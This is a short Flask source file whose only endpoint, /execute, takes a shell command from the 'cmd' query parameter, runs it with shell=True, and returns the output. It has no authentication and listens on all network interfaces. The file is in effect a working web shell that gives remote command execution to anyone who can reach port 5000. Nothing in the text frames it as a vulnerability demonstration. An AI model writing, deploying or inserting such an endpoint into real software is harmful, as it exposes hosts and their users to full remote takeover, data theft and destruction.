from flask import Flask,request
import subprocess

app = Flask(__name__)

@app.route('/execute')
def execute_command():
    cmd = request.args.get("cmd")
    if cmd:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return result.stdout if result.returncode == 0 else f"Error: {result.stderr}"
    return "No command provided"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)